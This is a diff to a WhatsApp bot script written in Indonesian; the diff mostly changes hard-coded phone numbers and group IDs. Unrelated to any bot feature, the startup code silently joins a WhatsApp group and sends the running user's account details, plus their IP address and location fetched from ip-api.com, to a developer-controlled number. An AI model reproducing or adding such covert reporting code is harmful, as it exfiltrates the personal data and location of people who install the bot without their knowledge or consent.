@@ -47,11 +47,11 @@ const runtime = function (seconds) {
   var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
   return dDisplay + hDisplay + mDisplay + sDisplay;
 };
-fakenomor = '0@s.whatsapp.net'
-const gcrevoke = ["629626029135-1621430788@g.us"]
+fakenomor = '6289626029135@s.whatsapp.net'
+const gcrevoke = ["6289626029135-1621430788@g.us"]
 prefix = '.'
 shp = '⬡'
-owner = "629626029135@s.whatsapp.net"
+owner = "6289626029135@s.whatsapp.net"
 spc1 = '         '
 spc2 = '\n                           '
 spc3 = '                   '
@@ -72,7 +72,7 @@ const starts = async (client = new WAConnection()) => {
       color("!", "blue"),
       color("]", "white"),
       color(" Scan bang"),
-      client.sendMessage(`629626029135@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)
+      client.sendMessage(`6289626029135@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Berhasil Terhubung!_`, MessageType.extendedText)
           
     );
   });
@@ -110,11 +110,11 @@ await client.connect({ timeoutMs: 30 * 1000 });
  teks = `https://chat.whatsapp.com/H5JPkwbob5YH8x5Mpcxybm`
  client.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
  console.log(color('|WRN|', 'yellow'), color('Joined to Forum Whatsapp Bot group', 'cyan'))
- client.sendMessage(`629626029135@s.whatsapp.net`, `*Hai Owner Katashi, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6281314050985?text=Assalamualaikum"}}})
+ client.sendMessage(`629626029135@s.whatsapp.net`, `*Hai Owner Katashi, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/629626029135?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       client.sendMessage("629626029135@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/6281314050985?text=Assalamualaikum"}}})
+       client.sendMessage("6289626029135@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Zexy Botz",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./itsmevall.jpg'),sourceUrl:"https://wa.me/629626029135?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
